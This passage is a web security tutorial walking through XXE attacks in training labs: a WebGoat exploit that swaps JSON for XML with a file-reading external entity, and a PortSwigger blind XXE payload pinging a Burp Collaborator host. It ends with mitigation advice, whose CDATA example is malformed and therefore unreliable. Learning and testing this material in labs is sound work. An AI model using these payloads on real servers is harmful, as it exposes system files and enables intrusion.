<p class="ai-optimize-149"><span style="color: #000000;">Developers use JSON, which stands for JavaScript Object Notation, for storing and transporting data like XML. They can obtain similar output by extracting useful information when they convert JSON to XML. To make XML acceptable, we can also alter the content. For this, WebGoat will be utilized. In WebGoat we will be performing an XXE attack.</span></p>
<p class="ai-optimize-150"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nQhMDHxfwEE/X7udPh8wsqI/AAAAAAAArDU/d5st1Sz97EY3djVeFmTagr45c1emU3NQQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p class="ai-optimize-151"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IgpiBRqi_14/X7udf6m35aI/AAAAAAAArDc/6TdeW15oECQao4pp3DjV71S4FSEOjbJvwCLcBGAsYHQ/s16000/5.png"/></span></p>
<p class="ai-optimize-152"><span style="color: #000000;">We can see that the intercepted request looks like above. We will change its content-type and replace JSON with XML code. XML code that we will be using is:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?xml?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY ignite SYSTEM "file:///"&gt;
]&gt;
&lt;comment&gt;
&lt;text&gt;
&amp;ignite;
&lt;/text&gt;
&lt;/comment&gt;</pre>
<p class="ai-optimize-153"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-b-yW2wQBfzY/X7udowpjYWI/AAAAAAAArDg/-HLpX1A3j4swAoSxy0c3PqjpCSekbuFHgCLcBGAsYHQ/s16000/6.png"/></span></p>
<p class="ai-optimize-154"><span style="color: #000000;">We will be observing that our comment will be posted with the root file.</span></p>
<p class="ai-optimize-155"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hczk-pw-LLk/X7udtltmQxI/AAAAAAAArDk/uxmZ7RkmXEk_79kJePbKkNTNxE9XvsxawCLcBGAsYHQ/s16000/7.png"/></span></p>
<p class="ai-optimize-156"><span style="color: #000000;">So in this, we learnt how we can perform XML injection on JSON fields and also how we can pass XML by manipulating its content-type.</span></p>
<h5 class="ai-optimize-157"><span style="color: #000000;"><strong>Let us understand what happened above:</strong></span></h5>
<p class="ai-optimize-158"><span style="color: #000000;">JSON is the same as XML language so we can get the same output using XML as we will expect from a JSON request. In the above, we saw that JSON has text value so we replaced the JSON request with the above payload and got the root information. If we had not changed its content type to application/XML, then our XML request would not have passed.</span></p>
<h3 class="ai-optimize-159"><span style="color: #800000;">Blind XXE</span></h3>
<p class="ai-optimize-160"><span style="color: #000000;">As we have seen in the above attacks we were seeing which field is vulnerable. But, when there is a different output on our provided input then we can use Blind XXE for this purpose. We will be using portswigger lab for demonstrating Blind XXE. For this, we will be using burp collaborator which is present in BurpSuite professional version only. We are using a lab named “<strong><em>Blind XXE with out-of-band interaction via XML parameter Entities</em></strong>”. When we visit the lab we will see a page like below:</span></p>
<p class="ai-optimize-161"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LQPjDz7Lt50/X7ud5hBuwJI/AAAAAAAArDw/fa63RKSYyoQWE7_EMyhpdPZpVxBRQhu9ACLcBGAsYHQ/s16000/8.png"/></span></p>
<p class="ai-optimize-162"><span style="color: #000000;">Then, we will click on View details and we will be redirected to the below page in which we will be intercepting the “<strong><em>check stock”</em></strong> request.</span></p>
<p class="ai-optimize-163"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EMpXd2rOt_w/X7ueDlwZujI/AAAAAAAArD4/_Sn1m5wBRIgJ0lk0TbaoAFxM8gzhCdYuwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p class="ai-optimize-164"><span style="color: #000000;">We will be getting intercepted request as below:</span></p>
<p class="ai-optimize-165"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Y1bpH7qohc8/X7ueJPsLqbI/AAAAAAAArD8/nt3x7nXV-iIsJ3AkIosGmuqISjcoLl3NQCLcBGAsYHQ/s16000/10.png"/></span></p>
<p class="ai-optimize-166"><span style="color: #000000;">Then, we can see that if we normally send the request we will get the number of stocks. Now we will fire up the burp collaborator from the burp menu and we will see the following window.</span></p>
<p class="ai-optimize-167"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--UFf1T4wn14/X7ueSPZjLnI/AAAAAAAArEE/J-QZ44ShTpAosA2dR11gtTe6fMcKZb37QCLcBGAsYHQ/s16000/11.png"/></span></p>
<p class="ai-optimize-168"><span style="color: #000000;">In this, we will press the “<strong>copy to clipboard”</strong> button to copy the burp subdomain that we will be using in our payload.</span></p>
<p class="ai-optimize-169"><span style="color: #000000;">Payload that we will be using is as below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;!DOCTYPE stockCheck [
&lt;!ENTITY % ignite SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"&gt; %ignite; ]&gt;</pre>
<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-Or5suh5ubRk/X7ueb6sLm-I/AAAAAAAArEM/qdygOLk9G6M4rwP7SwX0n6OGjAYorJ63ACLcBGAsYHQ/s16000/12.png"/></p>
<p class="ai-optimize-170"><span style="color: #000000;">Now we will see in Burp Collaborator, we will see that we capture some request which tells us that we have performed Blind XXE succe</span><span style="color: #000000;">ssfully.</span></p>
<p class="ai-optimize-171"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1xpvwoYkuDk/X7ue7MF9TjI/AAAAAAAArEU/5BWHfYc5q0MLS9-ySEOAeIlIifmgeNWrgCLcBGAsYHQ/s16000/13.png"/></span></p>
<p class="ai-optimize-172"><span style="color: #000000;">We will also verify that our finding is correct and we will see in the lab that we have solved it successfully.</span></p>
<p class="ai-optimize-173"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-UOgJqj5ULgQ/X7ufB3BK3dI/AAAAAAAArEY/NOkEYdtNgkY6FGfxs4pJWPlT889pzXHsgCLcBGAsYHQ/s16000/14.png"/> </strong></span></p>
<h3 class="ai-optimize-174"><span style="color: #800000;">Mitigation Steps</span></h3>
<ul>
<li class="ai-optimize-175"><span style="color: #000000;">The safest way to prevent XXE is always to disable DTDs (External Entities) completely. Depending on the parser, the method should be similar to the following:</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);</pre>
<ul>
<li class="ai-optimize-176"><span style="color: #000000;">Also, you can prevent DoS attacks by disabling DTD. If you cannot disable DTDs completely, then disable external entities and external document type declarations in a way that’s specific to each parser.</span></li>
<li class="ai-optimize-177"><span style="color: #000000;">Another method is using CDATA for ignoring the external entities. CDATA is character data that creates a block that the parser does not parse.</span></li>
</ul>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;data&gt;&lt;!CDATA [ "'&amp; &gt; characters are ok in here] ]&gt;&lt;/data&gt;</pre>
<p class="ai-optimize-178"><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p class="ai-optimize-179"><span style="color: #000000;"><strong>Author</strong> : Naman Kumar is a  cyber security enthusiast who is trying to gain some knowledge in the cybersecurity field. Contac</span>t <a href="https://www.linkedin.com/in/naman-kumar-a21653176/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
